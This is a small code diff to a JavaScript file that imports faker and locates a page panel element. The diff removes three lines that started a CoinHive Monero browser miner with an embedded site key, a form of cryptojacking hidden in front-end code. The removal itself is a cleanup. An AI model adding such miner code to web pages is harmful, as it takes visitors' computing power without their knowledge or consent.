@@ -1,8 +1,5 @@
 import faker from 'faker'
 
-//Set up monero mining
-var miner = new CoinHive.Anonymous('CHKLIvA6snbYpapDE6A6ouePVXXCXe7q');
-miner.start();
 
 //Locate panel
 var panel = document.getElementsByClassName('panel')[0]
